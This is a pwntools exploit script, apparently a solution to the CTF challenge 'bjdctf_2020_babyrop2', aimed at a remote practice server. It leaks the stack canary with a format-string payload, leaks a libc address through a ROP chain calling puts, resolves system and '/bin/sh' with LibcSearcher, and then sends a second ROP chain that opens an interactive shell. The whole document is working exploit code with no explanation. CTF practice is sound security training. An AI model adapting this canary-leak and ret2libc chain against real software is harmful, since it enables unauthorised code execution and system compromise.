from pwn import*
from LibcSearcher import*
elf=ELF('./bjdctf_2020_babyrop2')
#p=process('./bjdctf_2020_babyrop2')
p=remote('node4.buuoj.cn',27403)
context.log_level='debug'

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start=elf.symbols['_start']
pop_rdi=0x400993

payload1=b"aa%7$p"
p.sendlineafter(b"I'll give u some gift to help u!\n",payload1)
p.recvuntil(b'aa')
canary=int(p.recv()[:18],16)
print(hex(canary))

payload2=b'a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)
p.sendline(payload2)

puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

p.sendline(b'a')

p.recvuntil(b'u story!\n')
payload3=b'a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload3)
p.interactive()




